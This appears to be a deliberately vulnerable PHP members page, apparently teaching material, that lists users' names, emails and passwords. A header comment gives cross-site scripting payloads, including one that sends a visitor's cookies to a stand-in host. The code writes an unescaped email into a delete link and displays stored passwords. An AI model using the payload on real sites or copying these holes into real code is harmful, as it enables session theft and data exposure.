<?php
/*
This page is vulnerable to a cross-side scripting attack

try typing the following into the name or email field:

1. <script>location.href='http://bbc.co.uk'</script>

2. <script>myLoc = 'http://madeupuni.ac.uk?' + document.cookie; location.href=myLoc</script>
*/ ?>
<?php
session_start();
require_once "../pdo.php";
require '../templates/project_header.php';
require '../templates/project_footer.php';
require '../models/userauthorisation.php';
title_bar("Members area");

requireAuthorisation();
$stmt = $pdo->query("SELECT name, email, password FROM users");
$rows = $stmt->fetchAll(PDO::FETCH_ASSOC);
?>
<html>

<head>
    <link rel="stylesheet" href="../css/style.css">
</head>

<body>

    <section class="container">
        <table>
            <tbody>
                <tr>

                    <th>Name</th>
                    <th>Email</th>
                    <th>Password</th>
                    <th>Options</th>

                </tr>
                <tr>

                    <?php
                    foreach ($rows as $row) {
                        echo "<tr><td>";
                        echo (htmlentities($row['name']));
                        echo ("</td><td>");
                        echo (htmlentities($row['email']));
                        echo ("</td><td><div class='password-cell'>");
                        echo (htmlentities($row['password']));
                        echo'</div></td>';
                        echo ("<td>");
                        echo '<a href="deleteuser.php?deleteid=' . $row['email'] . '">Delete user</a>';
                        echo ("</td></tr>");
                    }
                    ?>

                </tr>
            </tbody>
        </table>
    </section>

    <section class="page-redirect-buttons">
        <form method="POST" action="addmember.php">
            <button type="submit" class="confirm-buttons">Add new user</button>
        </form>
        <form method="POST" action="stock.php">
            <button type="submit" class="confirm-buttons">Items page</button>
        </form>
        <form method="POST" action="logout.php">
            <button type="submit" class="confirm-buttons">Logout</button>
        </form>

    </section>
</body>

</html>